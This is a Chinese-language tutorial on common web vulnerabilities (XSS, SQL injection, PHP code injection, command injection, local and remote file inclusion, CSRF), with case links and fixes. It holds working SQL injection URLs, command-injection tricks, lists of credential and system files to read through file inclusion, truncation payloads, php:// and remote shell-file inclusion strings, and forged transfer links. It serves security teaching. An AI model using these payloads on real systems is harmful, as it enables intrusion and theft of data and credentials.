#Web常见漏洞
##XSS(cross site scripting)
**1、相关背景介绍**

---

　　跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。

**2、成因**

---
　　造成XSS漏洞的原因就是，攻击者的输入没有经过严格的控制，最终显示给来访的用户，攻击者通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java,VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、个人网页内容、会话和cookie等各种内容。

**3、攻击方式及危害**

---

XSS攻击方式通常分为三大类：

反射型XSS 存储型XSS DOM型XSS

但实际上还存在flash XSS以及一个比较新的概念mXSS，下面分别来介绍一下:

　　反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容）。

　　存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。

　　DOM型XSS，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。

　　flash XSS，利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。
　　mXSS，又被叫做突变XSS，主要被用于绕过XSS过滤。用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得一串看似没有任何危害的HTML代码，最终将进入某个DOM节点的innerHTML中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。

　　XSS可以在访问了被插入XSS页面的用户的浏览器上执行js，从而进行一系列的操作。常见的攻击方式主要是利用XSS盗取用户未受httponly保护的cookie，再使用盗取的cookie登陆服务器进行操作。

　　XSS常与CSRF漏洞结合起来使用，可在用户不知不觉中用用户的账号进行转账，加关注等操作。CSRF漏洞参见Cross-site Request Forgery/CSRF。
其它一些少见的利用方式包括利用XSS进行DDOS，参考：SOHU视频XSS漏洞导致其用户成为DDOS肉鸡。

**4、实际案例**

---
***Dom XSS案例***

[淘宝主域名下多处Dom XSS](http://www.wooyun.org/bugs/wooyun-2010-019556)

[腾讯微博一处两用DOM-XSS，能反射，能后门](http://www.wooyun.org/bugs/wooyun-2010-015530)

***存储型XSS案例***

[腾讯群空间存储型XSS](http://www.wooyun.org/bugs/wooyun-2010-020713)

***反射型XSS案例***

[新浪微博存在多处反射型XSS漏洞（firefox、chrome均可触发）](http://www.wooyun.org/bugs/wooyun-2010-0103570)

***mXSS案例***

[QQ空间某功能缺陷导致日志存储型XSS - 15](http://www.wooyun.org/bugs/wooyun-2010-051536)

***flash XSS案例***

[乌云主站存在一处反射型XSS漏洞](http://www.wooyun.org/bugs/wooyun-2014-057368)

***flash XSS+存储型XSS案例***

[百度首页Xss后门-可对用户进行持久劫持](http://www.wooyun.org/bugs/wooyun-2010-09732)

***XSS过滤绕过案例***

[新浪邮箱邮件正文XSS - 富文本过滤策略绕过](http://www.wooyun.org/bugs/wooyun-2010-019578)

[bilibili某子站存在反射型XSS漏洞可成功获取用户权限（XSS auditor bypass技巧）](http://www.wooyun.org/bugs/wooyun-2010-0113343)

[[腾讯实例教程] 那些年我们一起学XSS](http://wooyun.org/whitehats/心伤的瘦子)

**5、修复方案**

---
　　对XSS的防御需要根据实际情况对用户的输入进行严格的过滤。基于过滤的XSS防御方式通常可分为两种：基于黑名单的过滤和基于白名单的过滤。后者的防御效果往往更好，对于用户在白名单之外的输入，可以直接忽略。在构造白名单的过程中需要保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入内容。
Flash XSS的修复需要对相应的flash进行修改或升级替换。
在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时损失。

**6、漏洞扫描与发现**

---
XSScrapy - 快速，彻底的XSS / SQLI蜘蛛扫描
给它一个URL，它会测试每一个环节可能会发生的跨站攻击和SQL注入漏洞。
基本使用方法：
./xsscrapy.py -u http://example.com
如果你想登录以后然后爬行：
./xsscrapy.py -u http://example.com/login_page -l loginname
XSS结果会保存在xsscrapy-vulns.txt中
依赖安装包下载：
wget -O https://bootstrap.pypa.io/get-pip.py
python get-pip.py
pip install -r requirements.txt
github地址：https://github.com/DanMcInerney/xsscrapy

**7、相关资源**

---
Browser Security-基本概念
Browser Security-超文本标记语言（HTML）
Browser Security-css、javascript
Browser Security-同源策略、伪URL的域
XSS与字符编码的那些事儿 ---科普文
fuzzing XSS filter
一些你可能不知道的Flash XSS技巧
mXSS攻击的成因及常见种类
XSS和字符集的那些事儿
一种自动化检测 Flash 中 XSS 方法的探讨
常见Flash XSS攻击方式
延长 XSS 生命期


##SQL注入（SQL Injection）
**1、相关背景介绍**

---
　　结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。1986年10月，美国国家标准学会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持下成为国际标准。不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间的SQL不能完全相互通用。

　　SQL注入（SQL Injection）是一种常见的Web安全漏洞，攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。
**2、成因**

---
　　针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：

1. 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句

2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中

3. 攻击方式和危害

这里以MySQL为例。

**3.1 攻击方式**

---
　　SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为可显注入、报错注入和盲注：

　　可显注入：攻击者可以直接在当前界面内容中获取想要获得的内容
　　报错注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容
　　盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容

***3.1.1 可显注入代码示例：***

	http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,email_id,3 from  emails where id=3 --+
***3.1.2 报错注入代码示例：***
	
	http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+
***3.1.3 盲注代码示例：***

	http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select substr(email_id,1,1) from emails where id=3) > 'a' --+

**3.2 危害**

---
　　攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。

**4、实际案例**

---
***可显注入代码示例***

[乐视云官方接口泄漏(账户信息接口含密码&SQL注入)](http://www.wooyun.org/bugs/wooyun-2015-0106443)

***报错注入代码示例***

[17173游戏某站点MySQL报错注入(不带逗号注入的猜解过程)](http://www.wooyun.org/bugs/wooyun-2015-099907)

***盲注代码示例***

[淘宝网某站点存在MySQL注射(附验证脚本)](http://www.wooyun.org/bugs/wooyun-2010-083899)

**5、修复方案**

---
1. 使用参数检查的方式，拦截带有SQL语法的参数传入应用程序
2. 使用预编译的处理方式处理拼接了用户参数的SQL语句
3. 在参数即将进入数据库执行之前，对SQL语句的语义进行完整性检查，确认语义没有发生变化
4. 在出现SQL注入漏洞时，要在出现问题的参数拼接进SQL语句前进行过滤或者校验，不要依赖程序最开始处防护代码
5. 定期审计数据库执行日志，查看是否存在应用程序正常逻辑之外的SQL语句执行

**6、漏洞扫描与发现**

---
sqlmap 官方站点: [http://sqlmap.org/](http://sqlmap.org/)

介绍和使用：

[sqlmap用户手册](http://drops.wooyun.org/tips/143)

[sqlmap用户手册[续]](http://drops.wooyun.org/tips/401)

[SQLMAP进阶使用](http://drops.wooyun.org/tips/5254)


**7、相关资源**

---
[w3school：SQL语法系列教程](http://www.w3school.com.cn/sql/sql_syntax.asp)

[MySql注入科普](http://drops.wooyun.org/tips/123)

[利用insert，update和delete注入获取数据](http://drops.wooyun.org/tips/2078)

[MSSQL注射知识库 v 1.0](http://drops.wooyun.org/tips/1620)

[Mongodb注入攻击](http://drops.wooyun.org/tips/3939)

[在SQL注入中使用DNS获取数据](http://drops.wooyun.org/tips/5283)

[SQLMAP进阶使用](http://drops.wooyun.org/tips/5254)


##代码注入（CODE Injection）
**1、相关背景介绍**

---
　　当应用在调用一些能将字符串转化成代码的函数（如php中的eval）时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞。 狭义的代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。 广义上的代码注入，我觉得可以覆盖大半安全漏洞的分类。只要是用户可以控制的“数据”，被当做“代码”给注入到程序中，就是代码注入漏洞。如，SQL注入漏洞实际上是“数据”被当做SQL语句注入到正常SQL语句中了，XSS漏洞是数据被当做“javascript”被注入到HTML中了，文件包含漏洞是数据（某文件）被当做“脚本文件”被注入当正常脚本流程中了。 这个wiki主要介绍狭义上的代码注入漏洞。
　　**2、成因**

---
　　几种常用语言，都有将字符串转化成代码去执行的相关函数，如：

	- PHP：eval、assert
	- Javascript：eval
	- Vbscript: Execute、Eval
	- Python：exec
	- Java：Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞
　　应用有时候会考虑灵活性、简洁性，在代码中调用eval之类的函数去处理。如phpcms中很常用的string2array函数：

	function string2array($data) {
	if($data == '') return array();
	@eval("\$array = $data;");
	return $array;
	}
　　为什么一个赋值的语句，却要用eval包裹起来，变成一个危险的“定时炸弹”？ 其实这也是这种漏洞很重要的成因，我们来到phpcms的数据库，看看这个settings究竟是什么内容：

	array(
	  'upload_maxsize' => '2048,
	  'upload_allowext' => 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf',
	  'watermark_enable' => '1',
	  'watermark_minwidth' => '300',
	  'watermark_minheight' => '300',
	  'watermark_img' => '/statics/images/water/mark.png',
	  'watermark_pct' => '85',
	  'watermark_quality' => '80',
	  'watermark_pos' => '9',
	)
　　如上，其实settings是一个字符串形式的“php数组”，我们必须要用eval函数才能将“字符串”变成一个真正的数组，所以这也是phpcms里多次调用string2array函数的主要原因。很多CMS为了设置的灵活性，都会选择用eval来处理内容。但处理的同时并没有检查用户是否可以控制被处理的“字符串”。 所以，很明显的，如果我们能够控制phpcms的数据库，那么getshell也是很简单的了。
**3、攻击方式及危害**

---
以PHP为例讲解 JAVA等待补充，我感觉也很重要
PHP中能造成代码注入的主要函数： * eval * preg_replace + /e模式 * assert用的一般就是前两者，CMS中很少用到assert的，至于一些偏门函数就更少了，用的情况仅限于留后门。 常见用法也有如下一些：

	eval("\$ret = $data;"); 
	eval("\$ret = deal('$data');"); 
	eval("\$ret = deal("$data");"); 
	preg_replace('/<data>(.*)</data>/e', '$ret = "\\1";'); 
　　第一个就是刚才之前说phpcms的，通常$data不会直接来自POST或GET变量（要不也太水了），但通过一些二次漏洞很可能能够造出代码执行（如SQL注入）。 第二个是将$data使用一个函数（deal）处理后再赋值给$ret。那么，传参的方式就很重要了。第二个用的是单引号传参，那么我们只能先闭合单引号，之后才能注入代码。如果应用全局做了addslashes或GPC=on的话，就不能够注入代码了。 第三个与第二个类似，但使用的是双引号传参。双引号在代码中有个很重要的特性，它能解析其中的函数，如我们传入${phpinfo()}，phpinfo将会被执行，而得到的返回值作为参数传入deal函数。这个时候，我们就不用考虑闭合引号的事了。 第四个是preg_replace函数的误用。这种用法出现的情况是最多的，也是因为preg_replace第二个参数中，包裹正则结果\\1的是双引号，通过第三个中的方式，也能执行任意代码。
　　Python中，还有一个比较有意思的“代码注入”： python调用Pickle或cPickle对输入进行反序列化的时候，可能引入代码：Exploiting Misuse of Python's "Pickle" 同样的情况，当PHP调用unserialsize进行反序列化时，将不会引入代码，但也可能造成各种安全问题，对此不在本章中讨论。

**4、实际案例**

---
关于PHPCMS我说的第一种，案例：

[phpcms前台任意代码执行（有php版本限制）](http://www.wooyun.org/bugs/wooyun-2015-0104157)

[phpcms v9 后台远程代码执行漏洞（第三弹）](http://www.wooyun.org/bugs/wooyun-2010-046565)

[phpcms后台命令执行可getshell](http://www.wooyun.org/bugs/wooyun-2014-085518)

这几案例应该是copy了phpcms的string2array造成的：

[DayuCMS 1.525 前台任意代码执行](http://www.wooyun.org/bugs/wooyun-2010-087518)

[FineCMS v1.x远程代码执行漏洞](http://www.wooyun.org/bugs/wooyun-2010-061643)

这个也是String2Array类似函数造成的，但是经过了“入库”+“出库”+命令执行的二次操作：

PHPMyWind最新版代码执行漏洞

一个直接执行了eval($xxx)的案例：

[DESTOON前台getshell](http://www.wooyun.org/bugs/wooyun-2010-082805)

这几个就是我讲的第三种情况，eval的值在双引号内：eval(“\$title = \”$title\“;”);

[Destoon B2B 2014-05-21最新版csrf getshell](http://www.wooyun.org/bugs/wooyun-2010-062435)

[cmstop 远程代码执行漏洞（大众版）](http://www.wooyun.org/bugs/wooyun-2010-054693)

[某生活查询工具代码执行#可批量Getshell](http://www.wooyun.org/bugs/wooyun-2010-053172)

preg_replace造成的代码执行ThinkPHP：

[ThinkPHP 任意代码执行漏洞](https://butian.360.cn/vul/info/qid/QTVA-2013-08762)

这个案例也是preg_replace造成，但第二个参数的输出结果\\1并没有在引号中，所以也可以直接执行任意代码：

[方维购物分享最新版前台代码漏洞](http://www.wooyun.org/bugs/wooyun-2010-088871)

这个案例直接覆盖了preg_replace第一个参数，使用e修饰，造成代码执行：

[Discuz!某两个版本前台产品命令执行（无需登录)](http://www.wooyun.org/bugs/wooyun-2014-080723)

这个案例比较有意思，在线编码类网站时下越来越流行，所以“代码执行”是一个正常功能，但如果没有做沙盒或沙盒没做好的话，就能拿下服务器权限：

[某网站python在线练习系统设计缺陷导致getshell](http://www.wooyun.org/bugs/wooyun-2010-069669)

**5、修复方案**

---
　　1.能使用json保存数组、对象就使用json，不要将php对象保存成字符串，否则读取的时候需要使用eval。 2.对于必须使用eval的情况，一定要保证用户不能轻易接触eval的参数（或用正则严格判断输入的数据格式）。对于字符串，一定要使用单引号包裹可控代码，并再插入前进行addslashes：

	$data = addslashes($data);
	eval("\$data = deal('$data');");
3.放弃使用

	preg_replace
的e修饰符，而换用

	preg_replace_callback
替代。
 4.如果非要使用
 
	preg_replace
的e模式的话，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹。


##命令执行（OS Commanding）
**1、相关背景介绍**

---
　　当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。 这里还是主要以PHP为主介绍命令执行漏洞，Java等应用的细节待补充。

**2、成因**

---
　　脚本语言（如PHP）优点是简洁、方便，但也伴随着一些问题，如速度慢、无法接触系统底层，如果我们开发的应用（特别是企业级的一些应用）需要一些除去web的特殊功能时，就需要调用一些外部程序。
在PHP中可以调用外部程序的主要有以下函数：

	system
	exec
	shell_exec
	passthru
	popen
	proc_popen
　　一些偏门函数就不说了，以上函数主要是在wbeshell里用的多，实际上在正常应用中差别不太大，用的最多的还是前三个。
应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，又没有过滤用户的输入的情况下，就会造成命令执行漏洞。
常见的一些成因：
1.一些商业应用需要执行命令，商业应用的一些核心代码可能封装在二进制文件中，再web应用中通过system函数来调用之：

	system("/bin/program --arg $arg");
2.系统的漏洞造成命令注入：
　　不知各位看官是否还记得bash破壳漏洞，如果我们能够控制执行的bash的环境变量，就可以通过破壳漏洞来执行任意代码。

3.调用一些常用组件
　　很典型的就是Discuz中，可以选择使用ImageMagick这个常用的图片处理组件，对用户上传的图片进行处理（默认是GD库），而Discuz并没有很好控制用户的输入，造成命令执行，详见：DiscuzX系列命令执行分析公开（三连弹）。
　　另外JAVA中的命令执行漏洞（struts2/Elasticsearch Groovy等）很常见，亟待补充。

**3、利用方法及危害**

---
常见可控位置情况有下面几种：

	system("$arg"); //可控点直接是待执行的程序
	system("/bin/prog $arg"); //可控点是传入程序的整个参数
	system("/bin/prog -p $arg"); //可控点是传入程序的某个参数的值（无引号包裹）
	system("/bin/prog --p=\"$arg\""); //可控点是传入程序的某个参数的值（有双引号包裹）
	system("/bin/prog --p='$arg'"); //可控点是传入程序的某个参数的值（有单引号包裹）
第一种情况
　　如果我们能直接控制$arg，那么就能执行执行任意命令了，没太多好说的。
第二种情况
　　我们能够控制的点是程序的整个参数，我们可以直接用&&或|等等，利用与、或、管道命令来执行其他命令（可以涉及到很多linux命令行技巧）。
还有一个偏门情况，当$arg被escapeshellcmd处理之后，我们不能越出这个外部程序的范围，我们可以看看这个程序自身是否有“执行外部命令”的参数或功能，比如linux下的sendmail命令自带读写文件功能，我们可以用来写webshell。
第三种情况
　　我们控制的点是一个参数，我们也同样可以利用与、或、管道来执行其他命令，情境与二无异。
第四种情况
　　这种情况压力大一点，有双引号包裹。如果引号没有被转义，我们可以先闭合引号，成为第三种情况后按照第三种情况来利用，如果引号被转义（addslashes），我们也不必着急。linux shell环境下双引号中间的变量也是可以被解析的。我们可以在双引号内利用反引号执行任意命令“ id ”
第五种情况
　　这是最难受的一种情况了，因为单引号内只是一个字符串，我们要先闭合单引号才可以执行命令。如：system(“/bin/prog –p='aaa' | id”)
危害自然不言而喻，执行命令可以读写文件、反弹shell、获得系统权限、内网渗透等。
**4、案例**

---
srun3000有多处因为命令执行造成的getshell：
[深澜软件](http://www.wooyun.org/corps/深澜软件)
可控点是参数：
[宜搜某分站配置不当已被getshell](http://wooyun.org/bugs/wooyun-2010-087818)

可控点是参数的值：
[[再浅谈内网安全]--网神某带ids,waf网关设备完控0day又一枚](http://wooyun.org/bugs/wooyun-2010-027324)

一个python绕过沙盒执行系统命令：
[百度BAE系列2:系统命令执行,/etc/passwd及读写其它用户文件等](http://wooyun.org/bugs/wooyun-2010-020955)

**5、修复方案**

---
1.能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在disable_functions中禁用之。
2.对于可控点是程序参数的情况，使用escapeshellcmd函数进行过滤。
3.对于可控点是程序参数的值的情况，使用escapeshellarg函数进行过滤。
4.参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。


##本地文件包含（Local File Include）

**1、漏洞简介**

---
如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。

**2、漏洞成因**

---
文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。

**3、漏洞的检测及利用**

---
许多工具都支持本地文件包含漏洞的检测，Kadimus是其中一款。具体使用方法参见[Kadimus](https://github.com/P0cL4bs/Kadimus/)

以下是一些本地包含漏洞中常利用的服务器上的重要文件

	.htaccess
	/var/lib/locate.db
	/var/lib/mlocate/mlocate.db 
	/var/log/apache/error.log
	/usr/local/apache2/conf/httpd.conf
	/root/.ssh/authorized_keys
	/root/.ssh/id_rsa
	/root/.ssh/id_rsa.keystore
	/root/.ssh/id_rsa.pub
	/root/.ssh/known_hosts
	/etc/shadow
	/root/.bash_history
	/root/.mysql_history
	/proc/self/fd/fd[0-9]* (文件标识符)
	/proc/mounts
	/proc/config.gz
本地文件包含漏洞也常需要进行截断，以下是一些常用的截断方法

%00截断：

	/etc/passwd%00
(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
%00截断目录遍历：

	/var/www/%00
(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)
路径长度截断：

	/etc/passwd/././././././.[…]/./././././.
(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)
点号截断：

	/boot.ini/………[…]…………
(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)

**4、漏洞修复**

---
php中可以使用

	open_basedir
将用户文件访问限制在指定的区域。如将文件访问限制在

	/dir/user/
中。

在php.ini中设置

	open_basedir = /dir/user/
但该方法并不是万能的，在某些情况下仍可能会被绕过，参见[PHP绕过open_basedir列目录的研究。](http://drops.wooyun.org/tips/3978)

对传入的参数进行校检和过滤始终是有必要的。

**5、实际案例**

---
[金山软件官网文件包含问题](http://www.wooyun.org/bugs/wooyun-2010-073100)

[搜狗某分站目录遍历，本地文件包含，或通过日志getshell](http://www.wooyun.org/bugs/wooyun-2010-079392)

[Discuz3.2后台文件包含漏洞可后台拿shell](http://www.wooyun.org/bugs/wooyun-2010-065559)

**6、相关资源**

---
[Kadimus](https://github.com/P0cL4bs/Kadimus/)

[PHP文件包含漏洞总结](http://drops.wooyun.org/tips/3827)

[PHP绕过open_basedir列目录的研究](http://drops.wooyun.org/tips/3978)



##远程文件包含（Remote File Include）

**1、漏洞简介**

---
　　如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。

**2、漏洞成因**

---
　　文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在远程服务器上市，就形成的远程文件包含漏洞。

**3、漏洞的检测及利用**

---
无通用的检测方法，但是大部分扫描器都支持远程文件包含漏洞的检测。

以下是常用的引入远程文件的方法

常见的协议：

	[http|https|ftp]://example.com/shell.txt
	(需要allowurlfopen=On并且 allowurlinclude=On)

利用php流input：

	php://input
需要allowurlinclude=On,参考php:// — 访问各个输入/输出流（I/O streams），深入剖析PHP输入流 php://input

利用php流filter：

	php://filter/convert.base64-encode/resource=index.php
	需要allowurlinclude=On,参考php:// — 访问各个输入/输出流（I/O streams）

利用data URIs：

	data://text/plain;base64,SSBsb3ZlIFBIUAo=
	(需要allowurlinclude=On)

当服务器自动给文件增加后缀时可以在url之后增加'?'或者'#'，便可绕过。

**4、漏洞修复**

---
　　对引入文件包含的参数进行过滤，或者对所引入的文件的域进行限制，禁止服务器访问可信域以外的文件。

**5、实际案例**

---
[春秋航空某分站存在远程文件包含漏洞](http://www.wooyun.org/bugs/wooyun-2010-059641)

[爱爱医某站远程文件包含及mysql盲注](http://www.wooyun.org/bugs/wooyun-2010-0107969)

[华为某系统文件包含漏洞](http://www.wooyun.org/bugs/wooyun-2010-012031)

**6、相关资源**

---
[PHP文件包含漏洞总结](http://drops.wooyun.org/tips/3827)

[php:// — 访问各个输入/输出流（I/O streams](http://php.net/manual/zh/wrappers.php.php)

[深入剖析PHP输入流 php://input](http://www.nowamagic.net/academy/detail/12220520)



##Cross-site Request Forgery/CSRF

**1、相关背景介绍**

---
　　跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。

**2、成因**

---
　　由于开发人员对CSRF的了解不足，错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。例如，一个银行的转账功能（将100元转到BOB的账上）是通过如下方式实现的：

GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1
　　当攻击者MARIA诱导用户点击下面的链接时，如果该用户登录该银行网站的凭证尚未过期，那么他便在不知情的情况下转给了MARIA 100000元钱：

http://bank.com/transfer.do?acct=MARIA&amount=100000
简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

**3、攻击方式及危害**

---
***GET型与POST型CSRF***

　　GET型与POST型CSRF主要取决于相应操作对提交方式的限制，其原理都是事先构造出一个恶意的请求，然后诱导用户点击或访问，从而假借用户身份完成相应的操作。另外，有些POST型CSRF也可能会利用javascript进行自动提交表单完成操作。

***Flash CSRF***

　　Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如:

Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据：

	This XML file does not appear to have any style information associated with it. The document tree is shown below.
	<cross-domain-policy>
	    <allow-access-from domain="*"/>
	</cross-domain-policy>
　　Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。

***CSRF蠕虫***

　　CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如：某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！

**4、实际案例**

---
VIP：WooYun-2013-27258：http://www.wooyun.org/bugs/wooyun-2013-027258

虽然请求是POST类型，但仍可以使用GET进行提交，因此，攻击者可以直接将恶意的请求链接放在img标签的src处。如用户登录时看到这张图就会执行相应的操作。

blue：WooYun-2010-00780：http://www.wooyun.org/bugs/wooyun-2010-0780

　　该漏洞可导致用户点击攻击者构造的恶意页面后，在不知情的情况下将攻击者加入可访问的用户列表或空间访问密码被修改。

VIP：WooYun-2013-26825：http://www.wooyun.org/bugs/wooyun-2013-026825

由于TP-LINK路由器内所有操作均为GET，且未对CSRF进行防御，因此导致攻击者可以利用CSRF漏洞实现如：修改DNS、关闭防火防火墙等重要操作。

**5、修复方案**

---
　　因为攻击者获取不到伪造请求的响应结果，所以我们仅对那些会产生数据改变的服务进行重点防护即可，主要方式如下：

验证HTTP Referer字段：
　　在通常情况下，访问一个安全受限页面的请求来自于同一个网站， HTTP 头中的Referer字段记录了该 HTTP 请求的来源地址，如果Referer中的地址不是来源于本网站则可认为是不安全的请求，对于该请求应予以拒绝。 
这种方法简单易行，对于现有的系统只需在加上一个检查Referer值的过滤器，无需改变当前系统的任何已有代码和逻辑。 
但是，这种方法存在一些问题需要考虑：首先，Referer 的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并且不能保证浏览器自身没有安全漏洞，将安全性交给第三方（即浏览器）保证，从理论上来讲是不可靠的；其次，用户可能会出于保护隐私等原因禁止浏览器提供Referer，这样的话正常的用户请求也可能因没有Referer信息被误判为不不安全的请求，无法提供正常的使用。 
* 添加token：

　　CSRF攻击之所以能够成功是因为攻击者可以伪造用户的请求，对此最好的防御手段就是让攻击者无法伪造这个请求。因此，我们可以在HTTP请求中以参数的形式添加一个随机的token，并在服务器端检查这个token是否正确，如不正确或不存在 ，则可以认为是不安全的请求，拒绝提供相关服务。 
注意：如果网站同时还存在xss漏洞时，上述token的方法将可能失效，因为xss可以模拟浏览器执行操作，攻击者通过xss漏洞读取token值后，便可以构造出合法的用户请求了。所以在做好CSRF防护的同时，相应的安全防护也应做好。

添加验证码：
　　在用户提交数据之前，让用户输入验证码，或者用户在进行关键操作时，让用户重新输入密码进行验证。 


对于Flash CSRF要对站点根目录CrossDomain.xml跨域获取信息权限做好控制，精确到子域，例如：
	
	<?xml version="1.0"?>
	<cross-domain-policy>
	    <allow-access-from domain="http://a.example.com" secure="true”/>
	    <allow-access-from domain="http://b.example.com" secure="true”/>
	</cross-domain-policy>
　　精确配置好信任域的同时，同时也要验证用户上传的文件内容，攻击者可以上传任意后缀但是内容为flash的文件继续进行CSRF攻击

**6、漏洞扫描与发现**

---
***6.1 GET类型的CSRF的检测***

　　如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在CSRF漏洞。

***6.2 POST类型的CSRF的检测***


　　如果有token等验证参数，先去掉参数尝试能否正常请求。 如果可以，再去掉referer参数的内容，如果仍然可以，说明存在CSRF漏洞，可以利用构造外部form表单的形式，实现攻击。 如果直接去掉referer参数请求失败，这种还可以继续验证对referer的判断是否严格，是否可以绕过。 一般用这种形式的进行判断，http://wooyun.org.xxx.com/a/b.php 或者 http://xxx.com?r=http://wooyun.org 这样如果对referer判断直接用的indexOf判断的话，或者正则表达式不够严格的情况，就可以被绕过从而形成CSRF攻击。

***6.3 特殊情况的POST类型的CSRF检测***

